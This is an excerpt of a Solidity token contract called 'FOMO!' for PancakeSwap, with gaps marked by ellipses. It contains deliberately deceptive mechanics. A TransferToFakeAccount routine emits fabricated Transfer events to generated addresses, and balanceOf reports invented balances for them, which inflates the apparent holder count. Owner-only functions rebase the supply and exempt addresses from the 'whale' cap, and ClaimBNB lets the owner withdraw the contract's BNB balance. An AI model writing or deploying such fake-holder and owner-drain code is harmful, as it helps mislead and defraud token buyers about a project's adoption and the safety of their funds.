 ...
 */
contract FOMO is ERC20Detailed, Ownable {
    ...
    uint256 private _supply=INITIAL_FRAGMENTS_SUPPLY;
    ...
    address payable public marketingAddress=0xdC8F8441Efe76ac52e2541516868c09aCee82ca8;
    ...
    //address constant Pancake=0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3;
    address constant Pancake=0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address currentRecipient=0xf000000000000000000000000000000000000000;
    
    constructor ()
        ERC20Detailed("FOMO!", "FOMO!", uint8(DECIMALS))
        public
    {
    ...
    function rebase() external onlyOwner returns (uint256)
    {
        ...
        uint256 percentSupply=_totalSupply.mul(5);
        uint256 Delta=percentSupply.div(100);
    ...
    uint currentRecipientSeed=0;
    function NextRecipient() public view returns (address){
        return address(uint160(uint(keccak256(abi.encodePacked(currentRecipientSeed)))));
    }
    function TransferToFakeAccount() private{
            currentRecipientSeed=currentRecipientSeed.add(12345);
            currentRecipient=NextRecipient();
            
            if(_gonBalances[currentRecipient]>0) return;
            FakeAccounts[currentRecipient]=true;
            FakeAccountCount++;
            emit Transfer(address(0), currentRecipient, 1);

    }
    mapping(address=>bool) FakeAccounts;
    uint FakeAccountCount;
    /**
    ...
    {
        if(FakeAccounts[who])
            return _totalSupply/(FakeAccountCount*1000);
   ...
   returns (bool)
   {
        ...
        returns (bool)
    {
      ...
      if(from != owner() && to != owner()){
        ...
        if(to!=uniswapV2PairAddress&&!_isExcluded[to])
            require((balanceOf(to)+value)<=(INITIAL_FRAGMENTS_SUPPLY/50),"Whale detected");
  ...
  function _approve(address owner, address spender, uint256 value) private {
    ...
    */
    ...
    function excludeAddress(address _addr, bool excluded)
        external
        onlyOwner
    {
      _isExcluded[_addr] = excluded;
        }
  ...
  function ClaimBNB(uint8 Percent) external onlyOwner {
    msg.sender.transfer(address(this).balance*Percent/100);
  }
